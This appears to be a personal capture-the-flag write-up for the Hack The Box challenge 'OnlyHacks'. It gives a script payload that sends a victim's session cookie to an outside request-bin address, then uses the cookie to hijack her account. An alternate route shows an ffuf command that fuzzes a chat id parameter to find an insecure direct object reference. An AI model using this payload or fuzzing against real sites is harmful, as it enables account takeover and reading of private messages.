
2025-03-02 18:03

Source: #htb 

we find a chat feature in the website 
Let's try to send her a simple HTML payload with see how the chat behaves.

We notice that the chat renders the HTML. Let's try to send a simple [[XSS]] payload to steal her cookie. Because, the challenge works over the Internet, the simplest way to catch the request is to create a [Request Bin](https://requestbin.whapi.cloud/) and use the address of the bin on our payload.

```html
<script>document.location="https://requestbin.whapi.cloud/16gnxcm1?inspect="+document.cookie</script>
```

Once we sent the payload, we refresh our bin and we notice two requests. One of the requests is because our browser also rendered the XSS payload. We inspect our cookie on the website and we grab the cookie from the request that doesn't match our own.

We replace the cookie on our browser on the website, we refresh the page and we are logged in as `Renata` and we can see the flag in her DMs

### Alternate

I noticed the URL is `http://94.237.59.40:56545/chat/?rid=6`
I can check to see if this is vulnerable to In-Direct Object Reference (IDOR) by fuzzing those numbers using [[ffuf]]

```sh
ffuf -w numbers.txt -u "http://94.237.59.40:56545/chat/?rid=FUZZ" -rate 1 -H "Cookie: session=eyJ1c2VyIjp7ImlkIjo1LCJ1c2VybmFtZSI6ImNub3gifX0.Z7QLQg.wZSPjLctGoZsvqTMijDBY6xMYkM"
```

6 returns a 200, expected. but 3 also returns a 200! 

### References
https://app.hackthebox.com/challenges/OnlyHacks